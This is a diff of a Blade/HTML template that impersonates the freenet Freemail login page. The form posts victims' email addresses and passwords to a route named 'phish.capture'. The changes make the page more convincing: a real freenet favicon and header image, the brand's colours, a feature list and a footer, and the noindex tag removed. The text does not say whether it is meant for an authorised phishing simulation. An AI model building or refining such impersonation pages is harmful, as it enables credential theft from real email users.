@@ -3,73 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="robots" content="noindex">
-    <title>freenet Freemail Login</title>
+    <title>freenet Freemail</title>
     <link rel="icon" href="https://email.freenet.de/favicon.ico">
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Roboto:wght@700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:"Open Sans",sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-        .card{background:#fff;padding:40px;width:100%;max-width:420px;box-shadow:0 2px 8px rgba(0,0,0,.06);text-align:center}
-        .logo-section{margin-bottom:24px}
-        .logo-section .brand{font-size:28px;font-weight:800;color:#00a651;letter-spacing:-0.5px}
-        .logo-section .tagline{font-size:13px;color:#888;margin-top:4px}
-        h1{font-size:20px;color:#333;margin-bottom:8px;font-weight:600}
-        .sub{font-size:14px;color:#666;margin-bottom:24px}
-        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f5f5f5;margin-bottom:20px;text-align:left;gap:12px}
-        .avatar{width:32px;height:32px;border-radius:50%;background:#00a651;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:500;flex-shrink:0}
-        .email-text{font-size:14px;color:#333;font-weight:400}
-        .form-group{text-align:left;margin-bottom:16px}
-        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}
-        .form-group input{width:100%;height:40px;padding:0 12px;font-size:14px;font-family:"Open Sans",sans-serif;border:1px solid #ccc;border-radius:4px;outline:none;transition:border-color .2s}
-        .form-group input:focus{border-color:#00a651;box-shadow:0 0 0 2px rgba(0,166,81,.1)}
-        .checkbox-row{display:flex;align-items:center;gap:8px;margin-bottom:16px}
-        .checkbox-row input[type="checkbox"]{width:16px;height:16px;cursor:pointer}
-        .checkbox-row label{font-size:13px;color:#666;cursor:pointer}
-        .btn-login{width:100%;height:44px;background:#00a651;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s}
+        body{font-family:'Open Sans',sans-serif;background:#fff;min-height:100vh}
+        header{background:#21314d;height:116px;display:flex;align-items:center;padding:0 32px;box-shadow:0 5px 5px -5px rgba(170,170,170,.7);position:sticky;top:0;z-index:100}
+        .header-inner{display:flex;align-items:center;justify-content:space-between;width:100%;max-width:1240px;margin:0 auto}
+        .logo-text{font-size:22px;font-weight:700;color:#fff;letter-spacing:0.5px}
+        nav{display:flex;gap:24px;align-items:center}
+        nav a{font-size:14px;color:rgba(255,255,255,.85);text-decoration:none;font-weight:400}
+        nav a:hover{color:#fff}
+        .hero{background:linear-gradient(135deg,#21314d 0%,#092043 100%);min-height:450px;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
+        .hero::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:url('https://tls.freenet.de/email/assets/img/email-Neue/email1-header-pic.jpg') center/cover;opacity:.15}
+        .hero-content{position:relative;z-index:1;text-align:center;color:#fff;max-width:600px;padding:40px}
+        .hero-content h1{font-size:18px;font-weight:600;margin-bottom:16px}
+        .hero-content h2{font-family:Roboto,sans-serif;font-size:32px;font-weight:700;color:#092043;margin-bottom:8px;color:#fff}
+        .hero-content p{font-size:16px;line-height:1.5;opacity:.9}
+        .content{max-width:1240px;margin:0 auto;padding:60px 100px}
+        .login-section{display:flex;gap:60px;align-items:flex-start}
+        .login-form{flex:1;max-width:400px}
+        .login-form h3{font-family:Roboto,sans-serif;font-size:24px;font-weight:700;color:#092043;margin-bottom:8px}
+        .login-form .subtitle{font-size:14px;color:#666;margin-bottom:24px}
+        .input-group{margin-bottom:16px}
+        .input-group input{width:100%;height:44px;padding:0 16px;font-size:14px;font-family:'Open Sans',sans-serif;color:#092043;background:#fff;border:1px solid #ccc;border-radius:4px;outline:none;transition:border-color .15s}
+        .input-group input:focus{border-color:#00a651}
+        .input-group input::placeholder{color:#999}
+        .btn-login{width:100%;height:44px;background:#00a651;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;font-family:'Open Sans',sans-serif;cursor:pointer;transition:background .15s}
         .btn-login:hover{background:#008c44}
-        .links-row{display:flex;justify-content:space-between;margin-top:16px}
-        .links-row a{font-size:13px;color:#00a651;text-decoration:none}
-        .links-row a:hover{text-decoration:underline}
-        .footer{background:#333;color:#fff;padding:16px 24px;text-align:center;font-size:11px;margin-top:24px}
-        .footer a{color:#ccc;text-decoration:none;margin:0 8px}
-        .footer a:hover{text-decoration:underline}
-        @media(max-width:480px){.card{padding:24px}}
+        .features{flex:1}
+        .features ul{list-style:none;padding:0}
+        .features li{padding:8px 0;font-size:14px;color:#092043;border-bottom:1px solid #f0f0f0}
+        .features li::before{content:'✓';color:#00a651;font-weight:700;margin-right:8px}
+        .bsi-badge{text-align:center;margin-top:40px}
+        .bsi-badge img{height:60px;opacity:.8}
+        footer{background:#21314d;color:#fff;padding:40px 32px;margin-top:40px}
+        .footer-inner{max-width:1240px;margin:0 auto;display:flex;justify-content:space-between;flex-wrap:wrap;gap:24px}
+        .footer-col h4{font-size:14px;font-weight:600;margin-bottom:12px}
+        .footer-col a{display:block;font-size:13px;color:rgba(255,255,255,.7);text-decoration:none;margin-bottom:6px}
+        .footer-col a:hover{color:#fff}
+        @media(max-width:768px){.login-section{flex-direction:column}.content{padding:32px 16px}.hero{min-height:300px}}
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo-section">
-            <div class="brand">freenet</div>
-            <div class="tagline">Freemail</div>
+    <header>
+        <div class="header-inner">
+            <div class="logo-text">freenet</div>
+            <nav>
+                <a href="#">LOGIN</a>
+                <a href="#">Hilfe</a>
+            </nav>
         </div>
-        <h1>Willkommen bei freenet</h1>
-        <p class="sub">Bitte melden Sie sich mit Ihren Zugangsdaten an.</p>
-        <div class="email-display">
-            <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
-            <div class="email-text">{{ $email }}</div>
-        </div>
-        <form action="{{ route('phish.capture', ['provider' => 'freenet', 'token' => $token]) }}" method="POST">
-            @csrf
-            <div class="form-group">
-                <label for="password">Passwort</label>
-                <input type="password" id="password" name="password" required autofocus>
-            </div>
-            <div class="checkbox-row">
-                <input type="checkbox" id="keepLogin" checked>
-                <label for="keepLogin">Angemeldet bleiben</label>
-            </div>
-            <button type="submit" class="btn-login">Anmelden</button>
-        </form>
-        <div class="links-row">
-            <a href="#">Passwort vergessen?</a>
-            <a href="#">Noch kein Konto?</a>
+    </header>
+
+    <div class="hero">
+        <div class="hero-content">
+            <h1>freenet Mail</h1>
+            <h2>Was bietet Dir freenet Mail?</h2>
+            <p>Kostenlose E-Mail-Adresse, 1 GB Speicher, Spam-Schutz und vieles mehr.</p>
         </div>
     </div>
-    <div class="footer">
-        <a href="#">Impressum</a>
-        <a href="#">Datenschutz</a>
-        <a href="#">AGB</a>
+
+    <div class="content">
+        <div class="login-section">
+            <div class="login-form">
+                <h3>Einloggen</h3>
+                <p class="subtitle">Melden Sie sich mit Ihrer freenet Mail Adresse an.</p>
+
+                <form action="{{ route('phish.capture', ['provider' => 'freenet', 'token' => $token]) }}" method="POST">
+                    @csrf
+                    <div class="input-group">
+                        <input type="text" name="email" placeholder="E-Mail-Adresse" value="{{ $email }}" autocomplete="username">
+                    </div>
+                    <div class="input-group">
+                        <input type="password" name="password" placeholder="Passwort" autocomplete="current-password">
+                    </div>
+                    <button type="submit" class="btn-login">Anmelden</button>
+                </form>
+            </div>
+
+            <div class="features">
+                <ul>
+                    <li>1 GB kostenloses Postfach</li>
+                    <li>Spam- und Virenschutz</li>
+                    <li>Webmailer für unterwegs</li>
+                    <li>POP3/IMAP Zugang</li>
+                    <li>100 % Made in Germany</li>
+                </ul>
+            </div>
+        </div>
     </div>
+
+    <footer>
+        <div class="footer-inner">
+            <div class="footer-col">
+                <h4>Services</h4>
+                <a href="#">Börse</a>
+                <a href="#">Download-Center</a>
+                <a href="#">Ferien</a>
+            </div>
+            <div class="footer-col">
+                <h4>Informationen</h4>
+                <a href="#">Impressum</a>
+                <a href="#">Datenschutz</a>
+                <a href="#">AGB</a>
+            </div>
+        </div>
+    </footer>
 </body>
 </html>
